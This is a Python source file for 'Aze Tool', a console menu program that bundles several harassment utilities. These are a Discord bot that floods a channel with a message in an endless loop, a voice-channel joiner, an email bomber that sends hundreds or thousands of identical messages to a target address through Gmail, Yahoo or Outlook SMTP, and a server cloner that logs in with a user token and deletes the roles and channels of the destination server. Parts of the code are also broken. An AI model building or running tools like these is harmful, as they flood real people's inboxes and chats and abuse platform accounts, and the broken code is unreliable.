mytitle = "Aze Tool - By Aze Studios"
import smtplib
import discord
import sys
import os
import json
import requests
from os import remove, system
import asyncio
from discord.ext import commands
from colorama import init as colorama_init
from colorama import Fore
from colorama import Style
from casa import Clone
from time import sleep

system("title "+mytitle)

client = discord.Client()

w = Fore.WHITE
b = Fore.BLACK
g = Fore.LIGHTGREEN_EX
y = Fore.LIGHTYELLOW_EX
m = Fore.LIGHTMAGENTA_EX
c = Fore.LIGHTCYAN_EX
lr = Fore.LIGHTRED_EX
lb = Fore.LIGHTBLUE_EX



colorama_init()
print('\n')
print('\n')
print(f'{Fore.RED}                █████╗ ███████╗███████╗    ███████╗████████╗██╗   ██╗██████╗ ██╗ ██████╗ ███████╗')
print(f'{Fore.RED}               ██╔══██╗╚══███╔╝██╔════╝    ██╔════╝╚══██╔══╝██║   ██║██╔══██╗██║██╔═══██╗██╔════╝')
print(f'{Fore.RED}               ███████║  ███╔╝ █████╗      ███████╗   ██║   ██║   ██║██║  ██║██║██║   ██║███████╗')
print(f'{Fore.RED}               ██╔══██║ ███╔╝  ██╔══╝      ╚════██║   ██║   ██║   ██║██║  ██║██║██║   ██║╚════██║')
print(f'{Fore.RED}               ██║  ██║███████╗███████╗    ███████║   ██║   ╚██████╔╝██████╔╝██║╚██████╔╝███████║')
print(f'{Fore.RED}               ╚═╝  ╚═╝╚══════╝╚══════╝    ╚══════╝   ╚═╝    ╚═════╝ ╚═════╝ ╚═╝ ╚═════╝ ╚══════╝\n')
                                                                                                                                                                             
print(f'{Fore.RED}Created by {Fore.YELLOW}@lamnotfair#0 & AZE/PVP#6112')
print(f'{Fore.RED}Discord server : {Fore.BLUE}https://discord.gg/AfcfcFvXCW')

print(f'{Fore.RED}                                      -------------------------------------- ')   
print(f'{Fore.RED}                                     |1.SpamBOT          |4.Cloner          |')     
print(f'{Fore.RED}                                     |-------------------|------------------|') 
print(f'{Fore.RED}                                     |2.VC Joiner        |5.soon            |') 
print(f'{Fore.RED}                                     |-------------------|------------------|') 
print(f'{Fore.RED}                                     |3.Email bomber     |6.soon            |')                                                                                   
print(f'{Fore.RED}                                      -------------------------------------- ')      
select = int(input("[>] "))       
print('\n')
if select == 1:
    token = input("BOTS Token here : ")    
    prefix = '!'
    bot = commands.Bot(command_prefix=prefix)
    @bot.event
    async def on_ready():
        print(f'{bot.user.name} is ready...')
    message = input("Message here : ")
    print(f'{Fore.RED}----------------------------------------')  
    print(f'{Fore.RED} Type !spam in chat for start!')  
    @bot.command()
    async def spam(ctx):
        while True:
            await ctx.send(message)
            await ctx.send(message)
            await ctx.send(message)
            await ctx.send(message)
            await ctx.send(message)
            await ctx.send(message)
            await ctx.send(message)
            await ctx.send(message)
            await ctx.send(message)
            await ctx.send(message)
    bot.run(token)
    
#@commands.command()
#async def join_voice(self, ctx):
#    connected = ctx.author.voice
#    if connected:
#        await connected.channel.connect()
elif select == 2:
    token = input("BOTS Token here : ")    
    prefix = '!'
    bot = commands.Bot(command_prefix=prefix)
    @bot.event
    async def on_ready():
        print(f'{bot.user.name} is ready...')
    print(f'{Fore.RED}----------------------------------------')  
    print(f'{Fore.RED} Type !join_voice in chat for start!')  
    #@bot.command()
    @bot.command()
    async def join_voice(self, ctx):
        connected = ctx.author.voice
        if connected:
            await connected.channel.connect()
    bot.run(token)

elif select == 3:
    class bcolors:
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        RED = '\033[91m'


    def banner():
        print(bcolors.GREEN + '''Email-bomber''')


    class Email_Bomber:
        count = 0

        def __init__(self):
            try:
                print(bcolors.RED + '\n--Initializing program--')
                self.target = str(input(bcolors.GREEN + 'Enter target email > '))
                self.mode = int(input(bcolors.GREEN + 'Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) <: '))
                if int(self.mode) > int(4) or int(self.mode) < int(1):
                    print('ERROR: Invalid Option. GoodBye.')
                    sys.exit(1)
            except Exception as e:
                print(f'ERROR: {e}')

        def bomb(self):
            try:
                print(bcolors.RED + '\n--Setting up bomb--')
                self.amount = None
                if self.mode == int(1):
                    self.amount = int(1000)
                elif self.mode == int(2):
                    self.amount = int(500)
                elif self.mode == int(3):
                    self.amount = int(250)
                else:
                    self.amount = int(input(bcolors.GREEN + 'Choose a CUSTOM amount <: '))
                print(bcolors.RED + f'\n--You have selected BOMB mode: {self.mode} and {self.amount} emails--')
            except Exception as e:
                print(f'ERROR: {e}')

        def email(self):
            try:
                print(bcolors.RED + '\n--Setting up email--')
                self.server = str(input(bcolors.GREEN + 'Enter email server | or select premade options - 1:Gmail 2:Yahoo 3:Outlook <: '))
                premade = ['1', '2', '3']
                default_port = True
                if self.server not in premade:
                    default_port = False
                    self.port = int(input(bcolors.GREEN + 'Enter port number <: '))

                if default_port == True:
                    self.port = int(587)

                if self.server == '1':
                    self.server = 'smtp.gmail.com'
                elif self.server == '2':
                    self.server = 'smtp.mail.yahoo.com'
                elif self.server == '3':
                    self.server = 'smtp-mail.outlook.com'

                self.fromAddr = str(input(bcolors.GREEN + 'Enter from address > '))
                self.fromPwd = str(input(bcolors.GREEN + 'Enter from password > '))
                self.subject = str(input(bcolors.GREEN + 'Enter subject > '))
                self.message = str(input(bcolors.GREEN + 'Enter message > '))

                self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
                ''' % (self.fromAddr, self.target, self.subject, self.message)

                self.s = smtplib.SMTP(self.server, self.port)
                self.s.ehlo()
                self.s.starttls()
                self.s.ehlo()
                self.s.login(self.fromAddr, self.fromPwd)
            except Exception as e:
                print(f'ERROR: {e}')

        def send(self):
            try:
                self.s.sendmail(self.fromAddr, self.target, self.msg)
                self.count +=1
                print(bcolors.YELLOW + f'BOMB: {self.count}')
            except Exception as e:
                print(f'ERROR: {e}')

        def attack(self):
            print(bcolors.RED + '\n--Attacking...--')
            for email in range(self.amount+1):
                self.send()
            self.s.close()
            print(bcolors.RED + '\n--Attack finished--')
            sys.exit(0)


    if __name__=='__main__':
        banner()
        bomb = Email_Bomber()
        bomb.bomb()
        bomb.email()
        bomb.attack()
        
elif select == 4:
    with open('config.json') as config_file: data = json.load(config_file)
    token = data['token']
    head = {'Authorization': str(token)}
    src = requests.get('https://discordapp.com/api/v6/users/@me', headers=head)
    if src.status_code == 200:
        print(f'{Fore.GREEN}[+] Your Token Is Valid {Style.RESET_ALL}')
        sleep(4)
    else:
        print(f'{Fore.RED}[-] Your Token Is Invalid {Style.RESET_ALL}')
        sleep(4)
        exit()
def cloner():
    print('\n')
    guild_s = input('Your Server ID That You Wnat To Copy > ')
    guild = input('Your Server ID To Copy The Server In Thare > ')
    input_guild_id = guild_s
    output_guild_id = guild  
    
    def mainanswer():
        cloner()
    
    @client.event
    async def on_ready():
        print('\n')
        print(f"{Fore.RED}Logged In as : {Fore.YELLOW}{client.user}")
        print(f"{Fore.RED}Cloning Server")
        guild_from = client.get_guild(int(input_guild_id))
        guild_to = client.get_guild(int(output_guild_id))
        await Clone.roles_delete(guild_to)
        await Clone.channels_delete(guild_to)
        await Clone.roles_create(guild_to, guild_from)
        await Clone.categories_create(guild_to, guild_from)
        await Clone.channels_create(guild_to, guild_from)
        await Clone.guild_edit(guild_to, guild_from)
        await asyncio.sleep(5)
        mainanswer()
    client.run(token, bot=False)



    mainanswer()